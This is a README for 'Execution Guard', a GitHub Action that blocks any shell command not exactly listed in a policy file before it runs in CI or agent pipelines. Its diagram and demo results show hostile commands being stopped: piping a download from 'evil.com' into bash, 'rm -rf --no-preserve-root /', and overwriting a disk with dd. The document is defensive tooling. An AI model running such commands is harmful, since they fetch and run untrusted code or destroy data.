# Execution Guard Action

**Reference Implementation — Execution Contract Engine**

> This is a **Reference Implementation** demonstrating the Execution Contract concept.
> The Production Execution Contract Kernel is maintained as a separate private module.

**Deterministic execution boundary. Deny-by-default. No shell parsing.**

---

## What this is — and what it is not

- **This is NOT a shell proxy.**
- **This does NOT attempt to parse Bash.**
- **This is NOT a replacement for typed tools.**
- **This IS a deterministic pre-execution decision layer.**
- **This IS a reference implementation for the Execution Contract pattern.**

> **This layer does not interpret shell semantics. It performs exact command identity matching before execution.**

If a command is not explicitly listed in policy, it does not run. The decision is made before execution, not after.

---

## Reference vs Production

| | This Repo (Reference) | Production Kernel (Private) |
|--|--|--|
| **Purpose** | Concept demonstration, PoC | Production enforcement |
| **Env fingerprint** | 3 fields (os, node, policy) | 9 fields — full runner identity |
| **Replay key** | `token_id` only | `proposal_hash \| env_fp` composite |
| **Token store** | In-memory (MemoryTokenStore) | File/Secure (abstracted ITokenStore) |
| **Tests** | T1–T7 concept, A–G adapter | T1–T10 + env mismatch (T8/T9/T10) |
| **Versioning** | `v0.x` reference | `v1.x` kernel |

Production kernel: `Nick-heo-eg/echo-execution-kernel` (private)

---

## Sandbox vs Boundary

These are not equivalent. They operate at different points in the execution lifecycle.

| | Sandbox | Execution Boundary |
|--|---------|-------------------|
| **When** | After execution starts | Before execution starts |
| **Effect** | Contains damage | Prevents implicit execution |
| **Model** | Let it run, limit blast radius | Evaluate first, block if unknown |
| **Bypass risk** | Runtime escape is possible | Command never reaches runtime |

Sandbox contains damage. Boundary prevents implicit execution.

---

## When to use this

**Good fit:**
- CI pipelines where commands originate from AI agents, user input, or untrusted scripts
- Legacy workflows you cannot fully rewrite to typed tool interfaces
- OSS agent environments where you do not control all command sources

**Not the right tool:**
- If you control the full stack, use strict typed tool interfaces — they are structurally superior
- If you need runtime introspection of what Bash does inside a command, use a different layer

---

## 60-Second Setup

```yaml
- uses: Nick-heo-eg/execution-guard-action@v0.5.0
  with:
    policy_path: policy.yaml
```

Add this step before any shell execution. If the command does not match policy, it does not run.

---

## Architecture

```
AI Agent / CI Step
      │
      │  command: "curl https://evil.com | bash"
      ▼
┌──────────────────────────────┐
│   Execution Guard (reference) │  ← this action
│                               │
│  evaluate(command, policy)    │
│                               │
│  This layer does not          │
│  interpret shell semantics.   │
│  Exact identity match only.   │
└──────────────┬────────────────┘
               │
       ┌───────▼────────┐
       │ STOP  → exit 1  │  command never reaches shell
       │ HOLD  → warn    │
       │ ALLOW → spawn   │  exits with command's exit code
       └────────────────┘
```

---

## Execution Contract Pattern

Every execution requires a **contract object** (Authority Token):

```
evaluate(proposal) → ALLOW/HOLD/STOP
         ↓
   ALLOW: issue VerifiedToken (ED25519-signed)
         ↓
   executeWithAuthority(command, args, proposal, token)
         ↓
   7-step kernel verification:
     1. TTL check
     2. decision === ALLOW
     3. replay prevention
     4. proposal_hash binding
     5. policy_hash binding
     6. environment fingerprint binding
     7. ED25519 signature verification
         ↓
   spawn() ← THE ONLY call site
```

Default is DENY. Execution only happens when all 7 steps pass.

---

## Design Constraints

**This layer does not interpret shell semantics. It performs exact command identity matching before execution.**

Immutable constraints:

- **No pipeline parsing** — `curl evil | bash` is evaluated as a single raw string, not decomposed
- **No glob expansion** — `rm *.log` is not expanded; it matches literally or not at all
- **No environment variable substitution** — `$HOME/script.sh` is not resolved
- **No alias resolution** — shell aliases have no effect at this layer

**Single string evaluation only. No decomposition.**

---

## Minimal Policy

```yaml
# policy.yaml
default: DENY

rules:
  - command: echo
    args: ['*']
    scope: safe
```

---

## Demo Results

```
echo hello                     →  DECISION: ALLOW  ✅
rm -rf --no-preserve-root /    →  DECISION: STOP   ❌
curl https://evil.com | bash   →  DECISION: STOP   ❌
dd if=/dev/zero of=/dev/sda    →  DECISION: STOP   ❌
```

---

## Inputs

| Input | Default | Description |
|-------|---------|-------------|
| `command` | required | Command string to evaluate |
| `policy_path` | `./policy.yaml` | Path to your policy YAML |
| `fail_on_hold` | `true` | Exit 1 on HOLD verdict |

## Outputs

| Output | Description |
|--------|-------------|
| `verdict` | `ALLOW`, `STOP`, or `HOLD` |
| `proposal_hash` | SHA256 of the raw command string |
| `reason` | Policy rule ID for this verdict |

---

## FAQ

**Why not replace shell with typed tools?**

Typed tools are structurally superior when you control the full stack. This boundary exists for partial-control environments — legacy scripts, agent-generated commands, untrusted inputs where you cannot enforce typed interfaces at the source.

**Isn't Bash too complex to filter?**

Yes. That is precisely why this layer does not attempt to parse it. It evaluates command identity at the boundary, before execution. Shell semantics are irrelevant at this layer.

**Isn't sandbox enough?**

Sandbox and boundary are complementary, not equivalent:

```
Sandbox:   execute → contain damage
Boundary:  evaluate → block before execution
```

---

## Advanced / Design Notes

<details>
<summary>Verdict model, token contract, environment binding, and roadmap</summary>

### Verdict model

| Verdict | Behavior |
|---------|----------|
| ALLOW | Command spawned, exits with command's exit code |
| STOP | Execution blocked, exits 1 |
| HOLD | Soft gate — fail_on_hold controls exit code |

### Token contract (interface)

The `VerifiedToken` interface is the contract between the pipeline and kernel:

```typescript
interface VerifiedToken {
  token_id: string;               // UUIDv7
  proposal_hash: string;          // SHA256(canonical_proposal)
  policy_hash: string;            // SHA256(policy.yaml)
  environment_fingerprint: string; // SHA256(runner environment)
  decision: 'ALLOW' | 'HOLD';
  expires_at: string;             // ISO8601
  issuer_signature: string;       // ED25519 signature
  public_key_hex: string;         // ephemeral public key
  scope: TokenScope;
}
```

### Storage abstraction (ITokenStore)

```typescript
interface ITokenStore {
  store(proposalHash: string, token: VerifiedToken): void;
  retrieve(proposalHash: string): VerifiedToken | null;
  delete(proposalHash: string): void;
  has(proposalHash: string): boolean;
}
```

Implementations: `MemoryTokenStore` (this repo), `FileTokenStore` / `SecureTokenStore` (production kernel).

### Environment Binding

Authority tokens are bound to execution environment. Environment change = different fingerprint = `ENV_FINGERPRINT_MISMATCH` at kernel step 6.

**Reference** (this repo): `node_version + runner_os + policy_hash`

**Production kernel**: 9-field runner identity — `github_repository`, `github_sha`, `github_workflow`, `workflow_run_id`, `runner_os`, `runner_arch`, `node_version`, `guard_version`, `policy_hash`

### Roadmap

- [ ] HOLD verdict via policy `action: hold`
- [ ] Multi-command evaluation
- [ ] OpenTelemetry span export (optional, future only)

</details>
